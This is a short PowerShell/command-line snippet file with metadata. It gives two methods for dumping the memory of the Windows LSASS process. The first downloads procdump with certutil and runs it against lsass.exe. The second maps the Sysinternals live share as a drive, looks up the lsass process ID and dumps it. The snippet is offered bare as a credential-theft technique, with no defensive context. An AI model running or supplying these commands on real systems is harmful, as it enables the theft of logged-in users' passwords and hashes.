---
id: 172ef57c-764b-446f-96b1-597115e60121
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.176863+00:00'
updated_at: '2023-04-10T20:37:14.794613+00:00'
---

# Code Snippet 172ef57c

**Language**: Powershell

```powershell
# HTTP method - using the default way
certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# SMB method - using the pid
net use Z: https://live.sysinternals.com
tasklist /fi "imagename eq lsass.exe" # Find lsass's pid
Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
```
